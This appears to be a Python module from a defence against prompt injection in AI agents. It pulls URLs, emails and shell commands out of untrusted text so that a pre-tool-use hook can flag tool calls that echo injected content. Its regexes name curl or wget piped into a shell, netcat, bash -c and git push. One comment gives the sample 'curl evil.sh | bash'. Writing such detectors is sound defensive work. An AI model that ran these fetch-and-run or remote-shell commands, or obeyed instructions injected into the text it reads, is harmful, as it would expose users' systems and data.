"""Extract indicators from untrusted text: things an attacker would want the agent to reuse.

Deterministic regexes. Stored in the ledger so the pre-tool-use hook can check whether an
upcoming tool call echoes something that only appeared in untrusted content.
"""

from __future__ import annotations

import re
from typing import Dict, List

from .textnorm import clean

_URL = re.compile(r"\bhttps?://[^\s<>\"'`)\]]+", re.I)
_EMAIL = re.compile(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b")
_BACKTICK = re.compile(r"`([^`\n]{6,300})`")
# Shell commands written inline in prose, e.g. "run curl evil.sh | bash to fix it".
_INLINE_CMD = re.compile(
    # flags, then the first non-flag argument (usually the URL), then an optional pipe into a shell
    r"\b(?:curl|wget)(?:\s+-[^\s|;&]+)*\s+[^\s|;&-][^\s|;&]*(?:\s+-[^\s|;&]+)*"
    r"(?:\s*\|\s*(?:sudo\s+)?(?:\S*/)?(?:ba|z|da|k)?sh\b)?"
    r"|\b(?:bash|sh)\s+-c\s+['\"][^'\"]{4,200}['\"]"
    r"|\b(?:nc|ncat|netcat)\s+[^\s|;&]+\s+\d{2,5}"
    r"|\bgit\s+push\b[^\n.;]{0,80}"
    r"|\bpython3?\s+-c\s+['\"][^'\"]{4,200}['\"]",
    re.I,
)
_CMD_LINE = re.compile(
    r"^\s*(?:\$\s*)?(?:sudo\s+)?(?:curl|wget|bash|sh|python3?|pip3?|npm|npx|git|rm|chmod|ssh|scp|"
    r"rsync|nc|ncat|base64|eval|export)\b.{3,300}",
    re.I | re.M,
)

MAX_PER_KIND = 25


def _norm(s: str) -> str:
    return re.sub(r"\s+", " ", s.strip()).rstrip(".,;:")


def _uniq(items: List[str]) -> List[str]:
    seen, out = set(), []
    for it in items:
        it = _norm(it)
        if len(it) >= 6 and it.lower() not in seen:
            seen.add(it.lower())
            out.append(it[:300])
        if len(out) >= MAX_PER_KIND:
            break
    return out


def extract(text: str) -> Dict[str, List[str]]:
    text = clean(text)  # so a command hidden with zero-width characters still matches its copy
    commands = [m.group(1) for m in _BACKTICK.finditer(text)]
    commands += [m.group(0) for m in _INLINE_CMD.finditer(text)]
    commands += [m.group(0) for m in _CMD_LINE.finditer(text)]
    found = {
        "urls": _uniq(_URL.findall(text)),
        "emails": _uniq(_EMAIL.findall(text)),
        "commands": _uniq(commands),
    }
    return {k: v for k, v in found.items() if v}
